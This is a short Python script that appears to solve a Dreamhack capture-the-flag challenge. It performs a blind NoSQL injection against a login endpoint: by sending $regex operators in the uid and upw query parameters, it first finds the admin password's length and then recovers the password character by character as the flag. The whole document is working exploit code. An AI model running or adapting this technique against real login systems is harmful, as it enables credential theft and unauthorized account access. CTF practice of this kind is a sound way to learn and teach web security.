import requests
import string

url = 'http://host3.dreamhack.games:21858/login?uid[$regex]=^adm&upw[$regex]='
len = 1

while True:
    new_url = url + '.{{{num}}}'.format(num=len)
    c = requests.get(url=new_url)
    if 'admin' not in c.text:
        len -= 1
        print(len)
        break
    len += 1

charset = string.ascii_letters + string.digits
flag = 'DH{'
for i in range(3,len-1):
    for ch in charset:
        new_url = url + '^.{{{idx}}}'.format(idx=i) + ch
        c = requests.get(url=new_url)
        if 'admin' in c.text:
            flag += ch
            print(flag)
            break

print(flag+'}')